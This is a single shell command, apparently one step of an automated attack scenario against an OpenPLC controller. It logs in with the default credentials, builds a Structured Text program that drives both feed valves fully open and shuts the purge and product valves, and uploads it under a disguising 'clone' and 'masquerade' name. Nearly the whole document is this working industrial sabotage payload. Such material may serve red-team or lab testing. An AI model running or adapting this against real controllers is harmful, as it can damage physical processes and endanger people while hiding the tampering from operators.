steps.command:
curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc" "http://192.168.95.2:8080/login" -o /dev/null && printf 'PROGRAM main1
' > /tmp/326339.st && printf '  VAR
' >> /tmp/326339.st && printf '    f1_valve_sp AT %%QW100 : UINT;
' >> /tmp/326339.st && printf '    f2_valve_sp AT %%QW101 : UINT;
' >> /tmp/326339.st && printf '    purge_valve_sp AT %%QW102 : UINT;
' >> /tmp/326339.st && printf '    product_valve_sp AT %%QW103 : UINT;
' >> /tmp/326339.st && printf '    run_bit AT %%QX5.0 : BOOL := TRUE;
' >> /tmp/326339.st && printf '  END_VAR
' >> /tmp/326339.st && printf '  f1_valve_sp := 65535;
' >> /tmp/326339.st && printf '  f2_valve_sp := 65535;
' >> /tmp/326339.st && printf '  purge_valve_sp := 0;
' >> /tmp/326339.st && printf '  product_valve_sp := 0;
' >> /tmp/326339.st && printf '  run_bit := TRUE;
' >> /tmp/326339.st && printf 'END_PROGRAM
' >> /tmp/326339.st && printf 'CONFIGURATION Config0
' >> /tmp/326339.st && printf '  RESOURCE Res0 ON PLC
' >> /tmp/326339.st && printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
' >> /tmp/326339.st && printf '    PROGRAM instance0 WITH task0 : main1;
' >> /tmp/326339.st && printf '  END_RESOURCE
' >> /tmp/326339.st && printf 'END_CONFIGURATION
' >> /tmp/326339.st && curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/326339.st" "http://192.168.95.2:8080/upload-program" -o /tmp/plc_upload_form_masq.html && FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form_masq.html | head -1) && echo "PARSED_ST_FILENAME=$FN" && test -n "$FN" && curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action" -d "prog_name=326339_clone" -d "prog_descr=masquerade" -d "prog_file=$FN" -d "epoch_time=$(date +%s)" -o /tmp/plc_upload_action_masq.html && echo "$FN" > /tmp/plc_last_st_file.txt && echo "MASQUERADED_UPLOAD_DONE"

